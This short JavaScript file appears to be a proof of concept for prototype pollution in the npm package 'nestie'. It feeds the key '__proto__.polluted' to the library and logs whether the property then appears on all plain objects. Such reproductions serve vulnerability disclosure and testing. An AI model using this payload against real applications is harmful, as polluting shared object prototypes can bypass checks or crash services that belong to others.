var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
const {nestie} = require('nestie');
obj = {};
console.log({}.polluted);
nestie({ '__proto__.polluted': 'yes' });
console.log({}.polluted);